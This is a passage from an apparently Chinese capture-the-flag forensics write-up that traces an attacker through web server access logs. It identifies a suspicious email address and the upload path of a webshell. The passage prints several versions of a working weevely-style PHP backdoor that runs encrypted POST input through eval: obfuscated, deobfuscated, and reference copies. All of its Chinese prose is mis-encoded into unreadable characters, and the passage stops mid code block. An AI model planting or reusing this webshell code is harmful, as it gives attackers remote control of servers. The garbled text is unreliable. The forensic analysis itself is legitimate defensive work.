Firefox/60.0â€ï¼Œæˆ‘ä»¬åŒ¹é…è¿™ä¸ªä¹‹ååœ¨åŒ¹é…ä¸€ä¸‹mail<code> cat access_log-20230426 | grep &quot;Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0&quot; | grep &quot;mail&quot;</code></p><p><img src="/images/tiesan/image-20230505145108428.png" alt="image-20230505145108428"></p><p>ä»”ç»†çœ‹ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªå¯ç–‘é‚®ç®±ï¼Œä¸º<a href="mailto:&#x61;&#100;&#109;&#105;&#x6e;&#x40;&#122;&#x7a;&#46;&#99;&#111;&#x6d;">&#x61;&#100;&#109;&#105;&#x6e;&#x40;&#122;&#x7a;&#46;&#99;&#111;&#x6d;</a>ï¼Œå¯ä»¥æäº¤è¯•è¯•ï¼Œè¿™é‡Œå†ä»”ç»†åˆ†æï¼Œå»æœç´¢è¿™ä¸ªé‚®ç®±</p><p><img src="/images/tiesan/image-20230505145238135.png" alt="image-20230505145238135"></p><p>è¿™é‡Œå› ä¸ºåœ¨webé¡µé¢@ä¼šurlç¼–ç ï¼Œæˆ‘ä»¬å°±ç›´æ¥æœzz.comä¸€æ ·çš„ï¼Œå‘ç°ä¸‰ä¸ªï¼Œ</p><p><img src="/images/tiesan/image-20230505145615436.png" alt="image-20230505145615436"></p><p>å…¶ä¸­åœ¨åŒ…å«2495280è¿™ä¸€è¡Œçš„è¿™ä¸ªæ•°æ®åŒ…ä¸ºPOSTä¼ å‚ï¼Œæ‰€ä»¥åˆ¤å®šä¸ºæ·»åŠ çš„email</p><p>flag <a href="mailto:&#97;&#x64;&#109;&#105;&#x6e;&#64;&#x7a;&#x7a;&#46;&#x63;&#111;&#x6d;">&#97;&#x64;&#109;&#105;&#x6e;&#64;&#x7a;&#x7a;&#46;&#x63;&#111;&#x6d;</a></p><h4 id="6é»‘å®¢ç¬¬ä¸€æ¬¡ä¸Šä¼ æœ¨é©¬çš„ç»å¯¹è·¯å¾„ä¸ºå¤šå°‘ï¼Œè¯¥æœ¨é©¬æœªè¢«ä½¿ç”¨"><a href="#6é»‘å®¢ç¬¬ä¸€æ¬¡ä¸Šä¼ æœ¨é©¬çš„ç»å¯¹è·¯å¾„ä¸ºå¤šå°‘ï¼Œè¯¥æœ¨é©¬æœªè¢«ä½¿ç”¨" class="headerlink" title="6é»‘å®¢ç¬¬ä¸€æ¬¡ä¸Šä¼ æœ¨é©¬çš„ç»å¯¹è·¯å¾„ä¸ºå¤šå°‘ï¼Œè¯¥æœ¨é©¬æœªè¢«ä½¿ç”¨"></a>6é»‘å®¢ç¬¬ä¸€æ¬¡ä¸Šä¼ æœ¨é©¬çš„ç»å¯¹è·¯å¾„ä¸ºå¤šå°‘ï¼Œè¯¥æœ¨é©¬æœªè¢«ä½¿ç”¨</h4><p><code>cat access_log-20230426 | grep &quot;Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0&quot;</code></p><p>ç»§ç»­ä½¿ç”¨è¿™ä¸ªå‘½ä»¤å»çœ‹é»‘å®¢çš„æ“ä½œï¼Œåœ¨æœ€åé¢å¯ä»¥çœ‹åˆ°</p><p><img src="/images/tiesan/image-20230505150207488.png" alt="image-20230505150207488"></p><p>æœ‰ä¸ª1.phpï¼Œè¿™ä¸ª1.phpåœ¨è¯·æ±‚æ—¶ï¼Œä¸º404ï¼Œæ‰€ä»¥ä¸æ˜¯è¿™ä¸ªæ–‡ä»¶ï¼Œuploadåé¢çš„ä¹Ÿä¸æ˜¯ï¼Œæ¥ç€å¾€ä¸‹ï¼Œæœ‰ä¸€ä¸ªupload/055è¿™é‡Œï¼ŒåŒ¹é…ä¸€ä¸‹ï¼Œ</p><p><img src="/images/tiesan/image-20230505150429344.png" alt="image-20230505150429344"></p><p>å¯ä»¥çœ‹åˆ°æœ‰ç±»ä¼¼çš„æ“ä½œï¼Œæˆ‘ä»¬åˆ°è¯¦ç»†æ—¥å¿—åŒ…ä¸­å—¦ä¸€ä¸‹,å¦‚æœè¦æ˜¯åˆ©ç”¨è¿™ä¸ªæœ¨é©¬ï¼Œé‚£è‚¯å®šéœ€è¦POSTæäº¤ï¼Œæœç´¢<code>POST /upload/055</code></p><p><img src="/images/tiesan/image-20230505151035079.png" alt="image-20230505151035079"></p><p>å‘ç°æœ‰ä¸¤æ¡ï¼Œä¼°è®¡æ—¶è¿æ¥æ—¶çš„è¯·æ±‚ï¼Œåº”è¯¥æ˜¯æ²¡æœ‰åˆ©ç”¨</p><p>å…¶è·¯å¾„ä¸ºâ€œ/upload/055/741/33e/896eee6d3709e7ff535b01986e7de1aâ€</p><p>ä¸å¸¦é‚£ä¸ªæ–‡ä»¶å</p><p>flag <code>/var/www/html//upload/055/741/33e/</code></p><p>ä¸‹é¢çš„å°±æ˜¯æ²¡æœ‰åšå‡ºæ¥çš„äº†</p><h4 id="7é»‘å®¢ä¸Šä¼ çš„æœ¨é©¬æ–¹å¼ä¸ºä»€ä¹ˆï¼Œæœ¨é©¬å¯†ç ä¸ºä»€ä¹ˆï¼Œå¤§å†™å­—æ¯ï¼Œç”¨ç©ºæ ¼åˆ†å¼€"><a href="#7é»‘å®¢ä¸Šä¼ çš„æœ¨é©¬æ–¹å¼ä¸ºä»€ä¹ˆï¼Œæœ¨é©¬å¯†ç ä¸ºä»€ä¹ˆï¼Œå¤§å†™å­—æ¯ï¼Œç”¨ç©ºæ ¼åˆ†å¼€" class="headerlink" title="7é»‘å®¢ä¸Šä¼ çš„æœ¨é©¬æ–¹å¼ä¸ºä»€ä¹ˆï¼Œæœ¨é©¬å¯†ç ä¸ºä»€ä¹ˆï¼Œå¤§å†™å­—æ¯ï¼Œç”¨ç©ºæ ¼åˆ†å¼€"></a>7é»‘å®¢ä¸Šä¼ çš„æœ¨é©¬æ–¹å¼ä¸ºä»€ä¹ˆï¼Œæœ¨é©¬å¯†ç ä¸ºä»€ä¹ˆï¼Œå¤§å†™å­—æ¯ï¼Œç”¨ç©ºæ ¼åˆ†å¼€</h4><p>æœ€å¼€å§‹ä»¥ä¸ºï¼Œè¿™ä¸ªä¸Šä¼ æœ¨é©¬çš„æ–¹å¼ä¸ºæ¼æ´æ–¹å¼å‘¢ï¼Œæ¯”å¦‚ååºåˆ—åŒ–ï¼Œå•¥çš„ï¼Œæœ€åå‘ç°ä¸ºhttpè¯·æ±‚æ–¹å¼ã€‚</p><p><img src="/images/tiesan/image-20230505151815232.png" alt="image-20230505151815232"></p><p>åœ¨è¯¦ç»†åŒ…ä¸­ï¼Œå¯ä»¥çœ‹åˆ°æœ€åè¯·æ±‚äº†111.phpï¼Œä½†æ˜¯ä¸Šé¢ä¼¼ä¹å¹¶æ²¡æœ‰å‡ºç°111.phpï¼Œå›åˆ°accessåŒ…ï¼Œå¯¹è¿™ä¸ªæœ¨é©¬å‰é¢çš„POSTè¯·æ±‚è¿›è¡Œä¼šæ‰¾æ—¶ï¼Œä¹Ÿæ²¡æœ‰å‘ç°ä»€ä¹ˆ</p><p><img src="/images/tiesan/image-20230505152320785.png" alt="image-20230505152320785"></p><p>å¾€ä¸‹å¯ä»¥çœ‹åˆ°ä¸€ä¸ª111.php è¢«POSTåˆ©ç”¨ï¼Œå¯ä»¥çœ‹åˆ°æ—¶curlçš„ï¼Œæ˜¯PUTä¼ å‚æ–¹å¼äº†</p><p><img src="/images/tiesan/image-20230505152435124.png" alt="image-20230505152435124"></p><p>æ¥ä¸‹æ¥ï¼Œå¼€å§‹ç ”ç©¶è¿™ä¸ªæœ¨é©¬</p><p>è¿™ä¸ª111.phpæ˜¯åœ¨ï¼ŒæœåŠ¡å™¨ä¸­çš„ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥æŸ¥çœ‹çš„ï¼Œç°åœºçš„æ—¶å€™ï¼ŒæŠŠä»–ä¸‹è½½ä¸‹æ¥äº†ï¼Œå†…å®¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;=&quot;oO!tvN!y5TkuOg1fjf!&quot;;func!t!ion x($t,$k!)&#123;$c=str!len($k!);$l=s!tr&#x27;</span>;</span><br><span class="line"><span class="variable">$u</span>=str_replace(<span class="string">&#x27;kA&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;crkAeatkAekA_fkAkAunkAction&#x27;</span>);</span><br><span class="line"><span class="variable">$F</span>=<span class="string">&#x27;;$j++,$i++!)!!&#123;$o.=$t&#123;$i&#125;^$k&#123;$!j&#125;;!&#125;&#125;!return !$o;&#125;if (@pr!eg!!_&#x27;</span>;</span><br><span class="line"><span class="variable">$n</span>=<span class="string">&#x27;r=@b!ase65_en!code(!@x(@gzc!ompres!s($o),$k!));pri!nt!(&quot;$p$k!h$r$kf&quot;);&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$S</span>=<span class="string">&#x27;match(&quot;/$kh(.+)$!!kf/&quot;,@file!_get_!cont!ents!(&quot;php://in!put&quot;),$!&#x27;</span>;</span><br><span class="line"><span class="variable">$s</span>=<span class="string">&#x27;m)=!=2) &#123;@ob_star!t()!;@e!val!(@gz!uncompress(@x(@ba!se64!_deco!d&#x27;</span>;</span><br><span class="line"><span class="variable">$e</span>=<span class="string">&#x27;e($m![2!]),$k)));!$o=@ob_get!_co!ntents(!);@ob_end!_clean!();$!&#x27;</span>;</span><br><span class="line"><span class="variable">$I</span>=<span class="string">&#x27;!!$k=&quot;bd377!f!17&quot;;!$kh=&quot;9d4!cd50b4843&quot;;$kf=&quot;5b!d9ce82!0!932&quot;;$p&#x27;</span>;</span><br><span class="line"><span class="variable">$H</span>=<span class="string">&#x27;!len($t);$o=!&quot;&quot;;f!o!r($i=1;!$!i&lt;$l;)&#123;for($j=0;(!$j&lt;$c!!&amp;&amp;$i&lt;$!l)&#x27;</span>;</span><br><span class="line"><span class="variable">$J</span>=str_replace(<span class="string">&#x27;!&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$I</span>.<span class="variable">$b</span>.<span class="variable">$H</span>.<span class="variable">$F</span>.<span class="variable">$S</span>.<span class="variable">$s</span>.<span class="variable">$e</span>.<span class="variable">$n</span>);</span><br><span class="line"><span class="variable">$V</span>=<span class="variable">$u</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$J</span>);<span class="variable">$V</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    ----------------------------------------</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;=&quot;oO!tvN!y5TkuOg1fjf!&quot;;func!t!ion x($t,$k!)&#123;$c=str!len($k!);$l=s!tr&#x27;</span>;</span><br><span class="line"><span class="variable">$u</span>=str_replace(<span class="string">&#x27;kA&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;crkAeatkAekA_fkAkAunkAction&#x27;</span>);</span><br><span class="line"><span class="variable">$F</span>=<span class="string">&#x27;;$j++,$i++!)!!&#123;$o.=$t&#123;$i&#125;^$k&#123;$!j&#125;;!&#125;&#125;!return !$o;&#125;if (@pr!eg!!_&#x27;</span>;</span><br><span class="line"><span class="variable">$n</span>=<span class="string">&#x27;r=@b!ase65_en!code(!@x(@gzc!ompres!s($o),$k!));pri!nt!(&quot;$p$k!h$r$kf&quot;);&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$S</span>=<span class="string">&#x27;match(&quot;/$kh(.+)$!!kf/&quot;,@file!_get_!cont!ents!(&quot;php://in!put&quot;),$!&#x27;</span>;</span><br><span class="line"><span class="variable">$s</span>=<span class="string">&#x27;m)=!=2) &#123;@ob_star!t()!;@e!val!(@gz!uncompress(@x(@ba!se64!_deco!d&#x27;</span>;</span><br><span class="line"><span class="variable">$e</span>=<span class="string">&#x27;e($m![2!]),$k)));!$o=@ob_get!_co!ntents(!);@ob_end!_clean!();$!&#x27;</span>;</span><br><span class="line"><span class="variable">$I</span>=<span class="string">&#x27;!!$k=&quot;bd377!f!17&quot;;!$kh=&quot;9d4!cd50b4843&quot;;$kf=&quot;5b!d9ce82!0!932&quot;;$p&#x27;</span>;</span><br><span class="line"><span class="variable">$H</span>=<span class="string">&#x27;!len($t);$o=!&quot;&quot;;f!o!r($i=1;!$!i&lt;$l;)&#123;for($j=0;(!$j&lt;$c!!&amp;&amp;$i&lt;$!l)&#x27;</span>;</span><br><span class="line"><span class="variable">$J</span>=str_replace(<span class="string">&#x27;!&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$I</span>.<span class="variable">$b</span>.<span class="variable">$H</span>.<span class="variable">$F</span>.<span class="variable">$S</span>.<span class="variable">$s</span>.<span class="variable">$e</span>.<span class="variable">$n</span>);</span><br><span class="line"><span class="variable">$V</span>=<span class="variable">$u</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$J</span>);<span class="variable">$V</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$J</span>;  <span class="comment">//è¾“å‡ºä¸Šé¢é‚£ä¸ªJ</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€ä¸ªå…¸å‹çš„weevelyæœ¨é©¬ï¼Œåœ¨ä¸Šå‡ å±Šé“äººä¸‰é¡¹çš„æ¯”èµ›ä¸­ï¼Œéƒ½å‡ºç°äº†ç±»ä¼¼æœ¨é©¬ã€‚</p><p>ç®€å•åˆ†æä¸€ä¸‹æœ¨é©¬ï¼Œçœ‹èµ·æ¥å¾ˆä¹±ï¼Œå…¶å®å¾ˆç®€å•çš„æ··æ·†ï¼Œä»”ç»†çœ‹<code>$J=str_replace(&#39;!&#39;,&#39;&#39;,$I.$b.$H.$F.$S.$s.$e.$n);</code>è¿™ä¸€è¡Œï¼Œå…¶å®å°±æ˜¯æŠŠä¸Šé¢æ‰€æœ‰çš„å˜é‡ä¸­ï¼æ›¿æ¢ä¸ºç©ºï¼Œå°±å¯ä»¥äº†ã€‚è¿™é‡Œç›´æ¥è¿è¡Œåæ··æ·†å°±è¡Œ,æœ€ä¸‹é¢åŠ ä¸ªecho $Jå³å¯</p><p>è¿è¡Œåå¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$k</span>=<span class="string">&quot;bd377f17&quot;</span>;<span class="variable">$kh</span>=<span class="string">&quot;9d4cd50b4843&quot;</span>;<span class="variable">$kf</span>=<span class="string">&quot;5bd9ce820932&quot;</span>;<span class="variable">$p</span>=<span class="string">&quot;oOtvNy5TkuOg1fjf&quot;</span>;<span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$k</span></span>)</span>&#123;<span class="variable">$c</span>=strlen(<span class="variable">$k</span>);<span class="variable">$l</span>=strlen(<span class="variable">$t</span>);<span class="variable">$o</span>=<span class="string">&quot;&quot;</span>;<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">1</span>;<span class="variable">$i</span>&lt;<span class="variable">$l</span>;)&#123;<span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;(<span class="variable">$j</span>&lt;<span class="variable">$c</span>&amp;&amp;<span class="variable">$i</span>&lt;<span class="variable">$l</span>);<span class="variable">$j</span>++,<span class="variable">$i</span>++)&#123;<span class="variable">$o</span>.=<span class="variable">$t</span>&#123;<span class="variable">$i</span>&#125;^<span class="variable">$k</span>&#123;<span class="variable">$j</span>&#125;;&#125;&#125;<span class="keyword">return</span> <span class="variable">$o</span>;&#125;<span class="keyword">if</span> (@preg_match(<span class="string">&quot;/<span class="subst">$kh</span>(.+)<span class="subst">$kf</span>/&quot;</span>,@file_get_contents(<span class="string">&quot;php://input&quot;</span>),<span class="variable">$m</span>)==<span class="number">2</span>) &#123;@ob_start();@<span class="keyword">eval</span>(@gzuncompress(@x(@base64_decode(<span class="variable">$m</span>[<span class="number">2</span>]),<span class="variable">$k</span>)));<span class="variable">$o</span>=@ob_get_contents();@ob_end_clean();<span class="variable">$r</span>=@base65_encode(@x(@gzcompress(<span class="variable">$o</span>),<span class="variable">$k</span>));<span class="keyword">print</span>(<span class="string">&quot;<span class="subst">$p</span><span class="subst">$kh</span><span class="subst">$r</span><span class="subst">$kf</span>&quot;</span>);&#125;</span><br><span class="line">-----------</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$k</span> = <span class="string">&quot;bd377f17&quot;</span>;</span><br><span class="line"><span class="variable">$kh</span> = <span class="string">&quot;9d4cd50b4843&quot;</span>;</span><br><span class="line"><span class="variable">$kf</span> = <span class="string">&quot;5bd9ce820932&quot;</span>;</span><br><span class="line"><span class="variable">$p</span> = <span class="string">&quot;oOtvNy5TkuOg1fjf&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>, <span class="variable">$k</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$c</span> = strlen(<span class="variable">$k</span>);</span><br><span class="line">    <span class="variable">$l</span> = strlen(<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$o</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt; <span class="variable">$l</span>;) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; (<span class="variable">$j</span> &lt; <span class="variable">$c</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="variable">$l</span>); <span class="variable">$j</span>++, <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$o</span> .= <span class="variable">$t</span>&#123;<span class="variable">$i</span>&#125; ^ <span class="variable">$k</span>&#123;<span class="variable">$j</span>&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$o</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (@preg_match(<span class="string">&quot;/<span class="subst">$kh</span>(.+)<span class="subst">$kf</span>/&quot;</span>, @file_get_contents(<span class="string">&quot;php://input&quot;</span>), <span class="variable">$m</span>) == <span class="number">2</span>) &#123;</span><br><span class="line">    @ob_start();</span><br><span class="line">    @<span class="keyword">eval</span>(@gzuncompress(@x(@base64_decode(<span class="variable">$m</span>[<span class="number">2</span>]), <span class="variable">$k</span>)));</span><br><span class="line">    <span class="variable">$o</span> = @ob_get_contents();</span><br><span class="line">    @ob_end_clean();</span><br><span class="line">    <span class="variable">$r</span> = @base65_encode(@x(@gzcompress(<span class="variable">$o</span>), <span class="variable">$k</span>));</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;<span class="subst">$p</span><span class="subst">$kh</span><span class="subst">$r</span><span class="subst">$kf</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä»”ç»†çœ‹ä¸Šé¢è¿™ä¸ªä»£ç å’Œä¸‹é¢ç½‘ä¸Šæ‰¾çš„ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ç½‘ä¸Šæ‰¾åˆ°</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$k</span> = <span class="string">&quot;7ccf8192&quot;</span>;</span><br><span class="line"><span class="variable">$kh</span> = <span class="string">&quot;528271413977&quot;</span>;</span><br><span class="line"><span class="variable">$kf</span> = <span class="string">&quot;f541527062a9&quot;</span>;</span><br><span class="line"><span class="variable">$p</span> = <span class="string">&quot;ie3xNV9ea8twe7wl&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>, <span class="variable">$k</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$c</span> = strlen(<span class="variable">$k</span>);</span><br><span class="line">    <span class="variable">$l</span> = strlen(<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$o</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$l</span>;) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="variable">$c</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="variable">$l</span>; <span class="variable">$j</span>++, <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$o</span> .= <span class="variable">$t</span>[<span class="variable">$i</span>] ^ <span class="variable">$k</span>[<span class="variable">$j</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$o</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (@preg_match(<span class="string">&quot;/<span class="subst">&#123;$kh&#125;</span>(.+)<span class="subst">&#123;$kf&#125;</span>/&quot;</span>, @file_get_contents(<span class="string">&quot;php://input&quot;</span>), <span class="variable">$m</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">    @ob_start();</span><br><span class="line">    @<span class="keyword">eval</span>(@gzuncompress(@x(@base64_decode(<span class="variable">$m</span>[<span class="number">1</span>]), <span class="variable">$k</span>)));</span><br><span class="line">    <span class="variable">$o</span> = @ob_get_contents();</span><br><span class="line">    @ob_end_clean();</span><br><span class="line">    <span class="variable">$r</span> = @base64_encode(@x(@gzcompress(<span class="variable">$o</span>), <span class="variable">$k</span>));</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;<span class="subst">&#123;$p&#125;</span><span class="subst">&#123;$kh&#125;</span><span class="subst">&#123;$r&#125;</span><span class="subst">&#123;$kf&#125;</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ç”Ÿæˆçš„</span></span><br><span class="line"><span class="comment">//weevely generate 1 1.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$k</span> = <span class="string">&quot;c4ca4238&quot;</span>;</span><br><span class="line"><span class="variable">$kh</span> = <span class="string">&quot;a0b923820dcc&quot;</span>;</span><br><span class="line"><span class="variable">$kf</span> = <span class="string">&quot;509a6f75849b&quot;</span>;</span><br><span class="line"><span class="variable">$p</span> = <span class="string">&quot;FTxlZajQkHqbQYY5&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>, <span class="variable">$k</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$c</span> = strlen(<span class="variable">$k</span>);</span><br><span class="line">    <span class="variable">$l</span> = strlen(<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$o</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$l</span>;) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; (<span class="variable">$j</span> &lt; <span class="variable">$c</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="variable">$l</span>); <span class="variable">$j</span>++, <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$o</span> .= <span class="variable">$t</span>&#123;</span><br><span class="line">            <span class="variable">$i</span>&#125; ^ <span class="variable">$k</span>&#123;</span><br><span class="line">            <span class="variable">$j</span>&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$o</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (@preg_match(<span class="string">&quot;/<span class="subst">$kh</span>(.+)<span class="subst">$kf</span>/&quot;</span>, @file_get_contents(<span class="string">&quot;php://input&quot;</span>), <span class="variable">$m</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">    @ob_start();</span><br><span class="line">    @<span class="keyword">eval</span>(@gzuncompress(@x(@base64_decode(<span class="variable">$m</span>[<span class="number">1</span>]), <span class="variable">$k</span>)));</span><br><span class="line">    <span class="variable">$o</span> = @ob_get_contents();</span><br><span class="line">    @ob_end_clean();</span><br><span class="line">    <span class="variable">$r</span> = @base64_encode(@x(@gzcompress(<span class="variable">$o</span>), <span class="variable">$k</span>));</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;<span class="subst">$p</span><span class="subst">$kh</span><span class="subst">$r</span><span class="subst">$kf</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¯ä»¥ä»”ç»†çœ‹ï¼Œç½‘ä¸Šæ‰¾åˆ°å’Œç”Ÿæˆçš„æœ¨é©¬</p><p><img src="/images/tiesan/image-20230505154609718.png" alt="image-20230505154609718"></p><p>åœ¨è¿™ä¸ªåœ°æ–¹ä¸º1 å’Œbase64ï¼Œè€ŒæœåŠ¡å™¨ç»™çš„é‚£ä¸ª111.phpä¸ºï¼Œ2å’Œbase65ï¼Œæˆ‘å»googleäº†å¾ˆä¹…éƒ½æ²¡æœ‰æ‰¾åˆ°weevelyçš„base65ç§ç¼–ç æ–¹å¼</p><p><img src="/images/tiesan/image-20230505154907735.png" alt="image-20230505154907735"></p><p><img src="/images/tiesan/image-20230505154931539.png" alt="image-20230505154931539"></p><p>base64æœ‰å¾ˆå¤šï¼Œè¿™é‡Œä¹Ÿæœäº†if (@preg_match(â€œ/$kh(.+)$kf/â€œ, @file_get_contents(â€œphp://inputâ€), $m) == 1) {  ä¸º2æ—¶ï¼Œä¹Ÿæ²¡æœ‰æœåˆ°ï¼Œæ˜¾ç„¶è¿™ä¸ªæœ¨é©¬è¢«ä½œè€…ç»™æ›´æ”¹äº†ã€‚åœ¨æ¯”èµ›çš„æ—¶å€™æµªè´¹äº†å¾ˆå¤šå°‘æ—¶é—´ã€‚</p><p>è¯¦ç»†åˆ†æweevelyæœ¨é©¬å‚è€ƒè¿™ä¸ªå¤§å¸ˆå‚…çš„æ–‡ç« <code>https://xz.aliyun.com/t/11246#reply-18400</code>ï¼Œè¿™é‡Œæˆ‘å°±ä¸åšè¯¦ç»†åˆ†æäº†ã€‚</p><p>æˆ‘ä»¬åªéœ€è¦çŸ¥é“å‡ ç‚¹å°±å¯ä»¥äº†ã€‚åœ¨æœ¨é©¬æœ€åä¼š è¾“å‡º$p$kh$r$kfè¿™å‡ ä¸ªå˜é‡çš„å€¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 